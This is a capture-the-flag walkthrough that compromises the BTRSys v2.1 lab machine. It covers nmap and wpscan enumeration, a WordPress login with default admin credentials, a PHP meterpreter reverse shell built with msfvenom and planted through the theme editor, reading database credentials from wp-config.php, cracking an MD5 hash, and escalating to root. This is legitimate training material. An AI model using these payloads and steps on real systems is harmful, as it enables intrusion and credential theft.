BTRSys v2.1

Hi guys.

this is a next BTRSys of @ismailonderkaya.

Let's start !!!

First nmap will help to discover ip of target.

root@kali:~/Desktop# nmap 192.168.179.0/24

Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-17 07:30 EDT

Nmap scan report for 192.168.179.131
Host is up (0.0011s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:2C:A2:38 (VMware)

Nmap done: 256 IP addresses (5 hosts up) scanned in 229.98 seconds

Great the ip target is 192.168.179.131. Next scan it particularly.

root@kali:~/Desktop# nmap -v -A -T4 -p- 192.168.179.131

Nmap scan report for 192.168.179.131
Host is up (0.00099s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.179.130
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 08:ee:e3:ff:31:20:87:6c:12:e7:1c:aa:c4:e7:54:f2 (RSA)
|   256 ad:e1:1c:7d:e7:86:76:be:9a:a8:bd:b9:68:92:77:87 (ECDSA)
|_  256 0c:e1:eb:06:0c:5c:b5:cc:1b:d1:fa:56:06:22:31:67 (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_Hackers
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:2C:A2:38 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.8
Uptime guess: 0.047 days (since Tue Oct 17 06:58:55 2017)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Let check ftp. We can login with 2 credential anonymous:anonymous and ftp:ftp but nothings in there.

Go to check it in port 80.

root@kali:~/Desktop# curl -i -v --url "http://192.168.179.131"
* Rebuilt URL to: http://192.168.179.131/
*   Trying 192.168.179.131...
* TCP_NODELAY set
* Connected to 192.168.179.131 (192.168.179.131) port 80 (#0)
> GET / HTTP/1.1
> Host: 192.168.179.131
> User-Agent: curl/7.55.1
> Accept: */*
>
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Date: Tue, 17 Oct 2017 11:30:55 GMT
Date: Tue, 17 Oct 2017 11:30:55 GMT
< Server: Apache/2.4.18 (Ubuntu)
Server: Apache/2.4.18 (Ubuntu)
< Last-Modified: Thu, 27 Apr 2017 07:03:50 GMT
Last-Modified: Thu, 27 Apr 2017 07:03:50 GMT
< ETag: "51-54e208f152180"
ETag: "51-54e208f152180"
< Accept-Ranges: bytes
Accept-Ranges: bytes
< Content-Length: 81
Content-Length: 81
< Vary: Accept-Encoding
Vary: Accept-Encoding
< Content-Type: text/html
Content-Type: text/html

<
<div>
<a href="2.gif">
<img src="1.gif" width="100%" height="100%"/>
</a>
</div>
* Connection #0 to host 192.168.179.131 left intact

The main page just has 2 images. Nothing interesting. Let bruteforce directory !!!

root@kali:~/Desktop# gobuster -w /usr/share/wordlists/dirb/big.txt -u http://192.168.179.131/

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.179.131/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/big.txt
[+] Status codes : 200,204,301,302,307
=====================================================
/LICENSE (Status: 200)
/javascript (Status: 301)
/robots.txt (Status: 200)
/upload (Status: 301)
/wordpress (Status: 301)
=====================================================

Go check robots.txt. 

root@kali:~/Desktop/xemayhoangphuoc# curl -i -v --url "http://192.168.179.131/robots.txt"
*   Trying 192.168.179.131...
* TCP_NODELAY set
* Connected to 192.168.179.131 (192.168.179.131) port 80 (#0)
> GET /robots.txt HTTP/1.1
> Host: 192.168.179.131
> User-Agent: curl/7.55.1
> Accept: */*
> 
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Date: Tue, 17 Oct 2017 11:33:33 GMT
Date: Tue, 17 Oct 2017 11:33:33 GMT
< Server: Apache/2.4.18 (Ubuntu)
Server: Apache/2.4.18 (Ubuntu)
< Last-Modified: Tue, 25 Apr 2017 08:46:23 GMT
Last-Modified: Tue, 25 Apr 2017 08:46:23 GMT
< ETag: "5ab-54df9c225b5c0"
ETag: "5ab-54df9c225b5c0"
< Accept-Ranges: bytes
Accept-Ranges: bytes
< Content-Length: 1451
Content-Length: 1451
< Vary: Accept-Encoding
Vary: Accept-Encoding
< Content-Type: text/plain
Content-Type: text/plain

< 
Disallow: Hackers
Allow: /wordpress/


 .o+.                    :o/                                                   -o+`                
  /hh:                    shh`                                                  +hh-                
  /hh:                    shh`                         -/:                      +hh-                
  /hh:                    shh`                         +s+                      +hh-                
  /hh/............   `....shh-....   ...............`  `-`   `..............`   +hh-          ..    
  /hhyyyyyyyyyyyyy/ `syyyyyhhyyyyy. -yyyyyyyyyyyyyyy/  oys   +ssssssssssssss/   +hh-        .+yy-   
  /hh+---------/hh+  .----yhh:----  :hho------------`  yhy`  oyy------------`   +hh-      .+yys:`   
  /hh:         -hh+       shh`      :hh+               yhy`  oyy                +hh-   `.+yys/`     
  /hh:         -hh+       shh`      :hh+               yhy`  oss          `--   +hhsssssyhy/`       
  /hh:         -hh+       shh`      :hh+               yhy`  `-.          +yy.  +hho+++osyy+.       
  /hh:         -hh+       shh`      :hh+               yhy`               +yy.  +hh-    `/syy+.     
  /hho:::::::::+hh+       shh`      :hh+               yhy`  .::::::::::::oyy.  +hh-      `/yyy/`   
  :yyyyyyyyyyyyyyy:       +ys`      .yy:               oys   +sssssssssssssss`  /ys.        `/sy-   
   ```````````````         `         ``                 `     ``````````````     ``                
* Connection #0 to host 192.168.179.131 left intact

Hmmm. it allows wordpress directory. Now scan it with wpscan.

root@kali:~/Desktop/xemayhoangphuoc# wpscan --url http://192.168.179.131/wordpress/ --enumerate u --threads 50
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ Â®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.9.3
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.179.131/wordpress/
[+] Started: Tue Oct 17 07:40:22 2017

[!] The WordPress 'http://192.168.179.131/wordpress/readme.html' file exists exposing a version number
[+] Interesting header: SERVER: Apache/2.4.18 (Ubuntu)
[+] XML-RPC Interface available under: http://192.168.179.131/wordpress/xmlrpc.php
[!] Upload directory has directory listing enabled: http://192.168.179.131/wordpress/wp-content/uploads/
[!] Includes directory has directory listing enabled: http://192.168.179.131/wordpress/wp-includes/

[+] WordPress version 3.9.14 (Released on 2016-09-07) identified from advanced fingerprinting, meta generator, readme, links opml, stylesheets numbers
[!] 19 vulnerabilities identified from the version number

[!] Title: WordPress 2.9-4.7 - Authenticated Cross-Site scripting (XSS) in update-core.php
    Reference: https://wpvulndb.com/vulnerabilities/8716
    Reference: https://github.com/WordPress/WordPress/blob/c9ea1de1441bb3bda133bf72d513ca9de66566c2/wp-admin/update-core.php
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5488
[i] Fixed in: 3.9.15

[!] Title: WordPress 3.4-4.7 - Stored Cross-Site Scripting (XSS) via Theme Name fallback
    Reference: https://wpvulndb.com/vulnerabilities/8718
    Reference: https://www.mehmetince.net/low-severity-wordpress/
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/ce7fb2934dd111e6353784852de8aea2a938b359
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5490
[i] Fixed in: 3.9.15

[!] Title: WordPress <= 4.7 - Post via Email Checks mail.example.com by Default
    Reference: https://wpvulndb.com/vulnerabilities/8719
    Reference: https://github.com/WordPress/WordPress/commit/061e8788814ac87706d8b95688df276fe3c8596a
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5491
[i] Fixed in: 3.9.15

[!] Title: WordPress 2.8-4.7 - Accessibility Mode Cross-Site Request Forgery (CSRF)
    Reference: https://wpvulndb.com/vulnerabilities/8720
    Reference: https://github.com/WordPress/WordPress/commit/03e5c0314aeffe6b27f4b98fef842bf0fb00c733
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5492
[i] Fixed in: 3.9.15

[!] Title: WordPress 3.0-4.7 - Cryptographically Weak Pseudo-Random Number Generator (PRNG)
    Reference: https://wpvulndb.com/vulnerabilities/8721
    Reference: https://github.com/WordPress/WordPress/commit/cea9e2dc62abf777e06b12ec4ad9d1aaa49b29f4
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5493
[i] Fixed in: 3.9.15

[!] Title: WordPress 3.5-4.7.1 - WP_Query SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/8730
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/
    Reference: https://github.com/WordPress/WordPress/commit/85384297a60900004e27e417eac56d24267054cb
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611
[i] Fixed in: 3.9.16

[!] Title: WordPress 3.6.0-4.7.2 - Authenticated Cross-Site Scripting (XSS) via Media File Metadata
    Reference: https://wpvulndb.com/vulnerabilities/8765
    Reference: https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/28f838ca3ee205b6f39cd2bf23eb4e5f52796bd7
    Reference: https://sumofpwn.nl/advisory/2016/wordpress_audio_playlist_functionality_is_affected_by_cross_site_scripting.html
    Reference: http://seclists.org/oss-sec/2017/q1/563
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6814
[i] Fixed in: 3.9.17

[!] Title: WordPress 2.8.1-4.7.2 - Control Characters in Redirect URL Validation
    Reference: https://wpvulndb.com/vulnerabilities/8766
    Reference: https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/288cd469396cfe7055972b457eb589cea51ce40e
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6815
[i] Fixed in: 3.9.17

[!] Title: WordPress 2.3-4.8.2 - Host Header Injection in Password Reset
    Reference: https://wpvulndb.com/vulnerabilities/8807
    Reference: https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
    Reference: http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
    Reference: https://core.trac.wordpress.org/ticket/25239
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295

[!] Title: WordPress 2.7.0-4.7.4 - Insufficient Redirect Validation
    Reference: https://wpvulndb.com/vulnerabilities/8815
    Reference: https://github.com/WordPress/WordPress/commit/76d77e927bb4d0f87c7262a50e28d84e01fd2b11
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9066
[i] Fixed in: 3.9.19

[!] Title: WordPress 2.5.0-4.7.4 - Post Meta Data Values Improper Handling in XML-RPC
    Reference: https://wpvulndb.com/vulnerabilities/8816
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://github.com/WordPress/WordPress/commit/3d95e3ae816f4d7c638f40d3e936a4be19724381
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9062
[i] Fixed in: 3.9.19

[!] Title: WordPress 3.4.0-4.7.4 - XML-RPC Post Meta Data Lack of Capability Checks 
    Reference: https://wpvulndb.com/vulnerabilities/8817
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://github.com/WordPress/WordPress/commit/e88a48a066ab2200ce3091b131d43e2fab2460a4
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9065
[i] Fixed in: 3.9.19

[!] Title: WordPress 2.5.0-4.7.4 - Filesystem Credentials Dialog CSRF
    Reference: https://wpvulndb.com/vulnerabilities/8818
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://github.com/WordPress/WordPress/commit/38347d7c580be4cdd8476e4bbc653d5c79ed9b67
    Reference: https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_connection_information.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9064
[i] Fixed in: 3.9.19

[!] Title: WordPress 3.3-4.7.4 - Large File Upload Error XSS
    Reference: https://wpvulndb.com/vulnerabilities/8819
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://github.com/WordPress/WordPress/commit/8c7ea71edbbffca5d9766b7bea7c7f3722ffafa6
    Reference: https://hackerone.com/reports/203515
    Reference: https://hackerone.com/reports/203515
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9061
[i] Fixed in: 3.9.19

[!] Title: WordPress 3.4.0-4.7.4 - Customizer XSS & CSRF
    Reference: https://wpvulndb.com/vulnerabilities/8820
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://github.com/WordPress/WordPress/commit/3d10fef22d788f29aed745b0f5ff6f6baea69af3
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9063
[i] Fixed in: 3.9.19

[!] Title: WordPress 2.3.0-4.8.1 - $wpdb->prepare() potential SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/8905
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48
    Reference: https://github.com/WordPress/WordPress/commit/fc930d3daed1c3acef010d04acc2c5de93cd18ec
[i] Fixed in: 3.9.20

[!] Title: WordPress 2.3.0-4.7.4 - Authenticated SQL injection
    Reference: https://wpvulndb.com/vulnerabilities/8906
    Reference: https://medium.com/websec/wordpress-sqli-bbb2afcc8e94
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48
    Reference: https://wpvulndb.com/vulnerabilities/8905
[i] Fixed in: 4.7.5

[!] Title: WordPress 2.9.2-4.8.1 - Open Redirect
    Reference: https://wpvulndb.com/vulnerabilities/8910
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/41398
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14725
[i] Fixed in: 3.9.20

[!] Title: WordPress 3.0-4.8.1 - Path Traversal in Unzipping
    Reference: https://wpvulndb.com/vulnerabilities/8911
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/41457
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14719
[i] Fixed in: 3.9.20

[+] WordPress theme in use: twentyfourteen

[+] Name: twentyfourteen
 |  Latest version: 2.0 
 |  Last updated: 2017-06-08T00:00:00.000Z
 |  Location: http://192.168.179.131/wordpress/wp-content/themes/twentyfourteen/
 |  Style URL: http://192.168.179.131/wordpress/wp-content/themes/twentyfourteen/style.css
 |  Referenced style.css: wp-content/themes/twentyfourteen/style.css

[+] Enumerating plugins from passive detection ...
[+] No plugins found

[+] Enumerating usernames ...
[+] Identified the following 2 user/s:
    +----+--------+--------+
    | Id | Login  | Name   |
    +----+--------+--------+
    | 1  | btrisk | btrisk |
    | 2  | admin  | admin  |
    +----+--------+--------+

[+] Finished: Tue Oct 17 07:40:26 2017
[+] Requests Done: 119
[+] Memory used: 17.379 MB
[+] Elapsed time: 00:00:03


It has a ton of vulnerablities. First we should check user login with admin.
Try some common password. Opps admin's password is admin
Now we login. We notice in wordpress has another user is root. Now time to add code shell.
We go to Appeareance --> Editor and pick a file to add our reverse shell.

Now create a php reverse shell

root@kali:~/Desktop# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.179.130 LPORT=4444 -f raw > a.php
No platform was selected, choosing Msf::Module::Platform::PHP from the payload
No Arch selected, selecting Arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1116 bytes

Copy the content of a.php file to any file and save it.

Next turn of msfconsle and get a connection from the target.

root@kali:~/Desktop# msfconsole
Call trans opt: received. 2-19-98 13:24:18 REC:Loc

     Trace program: running

           wake up, Neo...
        the matrix has you
      follow the white rabbit.

          knock, knock, Neo.

                        (`.         ,-,
                        ` `.    ,;' /
                         `.  ,'/ .'
                          `. X /.'
                .-;--''--.._` ` (
              .'            /   `
             ,           ` '   Q '
             ,         ,   `._    \
          ,.|         '     `-.;_'
          :  . `  ;    `  ` --,.._;
           ' `    ,   )   .'
              `._ ,  '   /_
                 ; ,''-,;' ``-
                  ``-..__``--`

                             https://metasploit.com


       =[ metasploit v4.16.10-dev                         ]
+ -- --=[ 1687 exploits - 966 auxiliary - 299 post        ]
+ -- --=[ 499 payloads - 40 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > use exploit/multi/handler
msf exploit(handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.179.130
LHOST => 192.168.179.130
msf exploit(handler) > set LPORT 4444
LPORT => 4444
msf exploit(handler) > run
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 192.168.179.130:4444
msf exploit(handler) > [*] Sending stage (37514 bytes) to 192.168.179.131
[*] Meterpreter session 1 opened (192.168.179.130:4444 -> 192.168.179.131:34216) at 2017-10-17 07:05:42 -0400

msf exploit(handler) > sessions -l

Active sessions
===============

  Id  Name  Type                   Information             Connection
  --  ----  ----                   -----------             ----------
  1         meterpreter php/linux  www-data (33) @ ubuntu  192.168.179.130:4444 -> 192.168.179.131:34216 (192.168.179.131)

msf exploit(handler) > sessions 1
[*] Starting interaction with 1...

meterpreter > info
Usage: info <module>

Prints information about a post-exploitation module

meterpreter > sysinfo
Computer    : ubuntu
OS          : Linux ubuntu 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64
Meterpreter : php/linux

meterpreter > shell
python3 -c "import pty; pty.spawn('/bin/bash');"

Ok now we are in the target. Let check home directory.

www-data@ubuntu:/var/www/html/wordpress$ ls /home/
ls /home/
btrisk
www-data@ubuntu:/var/www/html/wordpress$ ls -la /home/btrisk/
ls -la /home/btrisk/
total 40
drwxr-xr-x 4 btrisk 1000 4096 Apr 24 10:05 .
drwxr-xr-x 3 root   root 4096 Mar 17  2017 ..
-rw------- 1 btrisk 1000  243 May  2 08:45 .bash_history
-rw-r--r-- 1 btrisk 1000  220 Mar 17  2017 .bash_logout
-rw-r--r-- 1 btrisk 1000 3771 Mar 17  2017 .bashrc
drwx------ 2 btrisk 1000 4096 Mar 17  2017 .cache
-rw------- 1 btrisk 1000  453 Mar 23  2017 .mysql_history
drwxrwxr-x 2 btrisk 1000 4096 Mar 21  2017 .nano
-rw-r--r-- 1 btrisk 1000  655 Mar 17  2017 .profile
-rw-r--r-- 1 btrisk 1000    0 Mar 17  2017 .sudo_as_admin_successful
-rw------- 1 btrisk 1000  586 Mar 21  2017 .viminfo

sudo_as_admin_sucessful. Hmmm hint from the author. Let try with admin's password. But no luck.
Ok let check wp databases.

www-data@ubuntu:/var/www/html/wordpress$ grep "DB_NAME" -A 10 -B 10 wp-config.php
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'rootpassword!');

/** MySQL hostname */
define('DB_HOST', 'localhost');

Now we get a new credential. Let try. No luck again. OK open mysql to get password of user root in wordpress.

www-data@ubuntu:/var/www/html/wordpress$ mysql -u root -p              
mysql -u root -p
Enter password: rootpassword!

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 44507
Server version: 5.7.17-0ubuntu0.16.04.1 (Ubuntu)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| deneme             |
| mysql              |
| performance_schema |
| phpmyadmin         |
| sys                |
| wordpress          |
+--------------------+
7 rows in set (0.01 sec)

mysql> use wordpress
use wordpress
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+----------------------------+
| Tables_in_wordpress        |
+----------------------------+
| wp_abtest_experiments      |
| wp_abtest_goal_hits        |
| wp_abtest_goals            |
| wp_abtest_ip_filters       |
| wp_abtest_variation_views  |
| wp_abtest_variations       |
| wp_commentmeta             |
| wp_comments                |
| wp_links                   |
| wp_masta_campaign          |
| wp_masta_cronapi           |
| wp_masta_list              |
| wp_masta_reports           |
| wp_masta_responder         |
| wp_masta_responder_reports |
| wp_masta_settings          |
| wp_masta_subscribers       |
| wp_masta_support           |
| wp_options                 |
| wp_postmeta                |
| wp_posts                   |
| wp_term_relationships      |
| wp_term_taxonomy           |
| wp_terms                   |
| wp_usermeta                |
| wp_users                   |
+----------------------------+
26 rows in set (0.00 sec)

mysql> select * from wp_users;
select * from wp_users;
+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                        | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | root       | a318e4507e5a74604aafb45e4741edd3 | btrisk        | mdemir@btrisk.com |          | 2017-04-24 17:37:04 |                     |           0 | btrisk       |
|  2 | admin      | 21232f297a57a5a743894a0e4a801fc3 | admin         | ikaya@btrisk.com  |          | 2017-04-24 17:37:04 |                     |           4 | admin        |
+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
2 rows in set (0.00 sec)

mysql> exit
exit
Bye

password is md5. Go to website https://hashkiller.co.uk/md5-decrypter.aspx and crack is. a318e4507e5a74604aafb45e4741edd3 = roottoor.
Now try it again.

www-data@ubuntu:/var/www/html/wordpress$ su -
su -
Password: roottoor

root@ubuntu:~# id
id
uid=0(root) gid=0(root) groups=0(root)

Booom !!!.

Done.

Thank @ismailonderkaya.

